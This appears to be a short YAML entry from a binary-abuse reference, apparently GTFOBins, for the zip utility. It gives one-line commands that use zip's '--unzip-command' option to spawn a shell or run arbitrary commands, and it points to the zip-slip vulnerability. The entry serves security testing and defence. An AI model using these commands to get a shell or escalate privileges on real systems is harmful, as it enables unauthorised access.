---
description: When dealing with zip, it may also be worth looking at the [zip-slip vulnerability](https://github.com/snyk/zip-slip-vulnerability).
functions:
  shell:
    - description: Can be used to execute arbitrary commands on a system and spawn shells either directly or otherwise.
      code: |
        zip /tmp/out.zip /etc/hostname -T --unzip-command="sh #"
  command:
    - description: Can be used to execute arbitrary commands on a system. Specifics vary depending on the version of zip used.
      code: |
        zip /tmp/out.zip /etc/hostname -T --unzip-command="uname -a #"
---
